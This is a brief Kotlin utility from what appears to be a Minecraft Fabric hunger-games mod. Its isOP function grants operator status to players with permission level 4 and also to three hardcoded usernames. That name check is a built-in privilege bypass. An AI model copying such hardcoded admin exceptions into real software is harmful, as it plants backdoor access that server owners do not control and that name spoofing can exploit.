package de.royzer.fabrichg.util

import net.minecraft.server.level.ServerPlayer

fun ServerPlayer.isOP(): Boolean {
    return hasPermissions(4) || name.string == "r0yzer" || name.string == "OAT_KILLER" || name.string == "Saquuuuu"
}